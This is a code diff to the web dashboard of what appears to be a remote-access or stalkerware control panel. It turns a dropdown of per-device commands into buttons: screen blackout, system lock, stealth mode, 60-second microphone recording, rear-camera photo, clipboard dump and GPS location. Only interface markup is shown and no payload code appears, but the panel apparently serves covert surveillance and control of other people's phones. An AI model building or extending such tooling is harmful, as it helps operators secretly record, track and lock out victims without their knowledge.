@@ -484,19 +484,16 @@ app.get('/', (req, res) => {
                 <td style="vertical-align: middle;">${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                 <td style="font-size: 0.72rem; color: #aaa; vertical-align: middle;">${formatTime(d.lastSeen)}</td>
                 <td style="vertical-align: middle; white-space: nowrap;">
-                    <div style="display: inline-flex; align-items: center; gap: 6px;">
-                        <a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" style="background: var(--neon-cyan); color: #000; padding: 5px 10px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">CONNECT</a>
-                        <select onchange="dispatchQuickCommand('${d.deviceId}', this.value); this.selectedIndex=0;" style="background: rgba(0,242,255,0.08) !important; color: var(--neon-cyan) !important; border: 1px solid var(--neon-cyan) !important; font-size: 0.65rem !important; padding: 4px 6px !important; border-radius: 6px !important; cursor: pointer; outline: none; width: auto !important; height: auto !important;">
-                            <option value="" disabled selected>⚡ ACTIONS</option>
-                            <option value="blackout">🕶️ Toggle Blackout</option>
-                            <option value="lock">🔒 Toggle System Lock</option>
-                            <option value="flashlight">🔦 Toggle Flashlight</option>
-                            <option value="mic">🎙️ Record Mic (60s)</option>
-                            <option value="photo">📷 Quick Photo (Rear)</option>
-                            <option value="stealth">👁️ Toggle Stealth Mode</option>
-                            <option value="clipboard">📋 Dump Clipboard Buffer</option>
-                            <option value="gps">🛰️ Instant GPS Fix</option>
-                        </select>
+                    <div style="display: inline-flex; align-items: center; gap: 4px; flex-wrap: wrap;">
+                        <a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" style="background: var(--neon-cyan); color: #000; padding: 4px 8px; border-radius: 4px; text-decoration: none; font-weight: bold; font-size: 0.6rem; display: inline-block;">CONNECT</a>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'blackout')" class="btn btn-small" style="${blackoutStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold;">🕶️ BLACKOUT: ${d.blackout ? 'ON' : 'OFF'}</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'lock')" class="btn btn-small" style="${lockStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold;">🔒 LOCK: ${d.locked ? 'ON' : 'OFF'}</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'flashlight')" class="btn btn-small" style="${lightStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold;">🔦 LIGHT: ${d.flashlight ? 'ON' : 'OFF'}</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'stealth')" class="btn btn-small" style="${stealthStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold;">👁️ STEALTH: ${d.stealth ? 'ON' : 'OFF'}</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'mic')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer;">🎙️ MIC</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'photo')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer;">📷 PHOTO</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'clipboard')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer;">📋 CLIP</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'gps')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer;">🛰️ GPS</button>
                     </div>
                 </td>
             </tr>
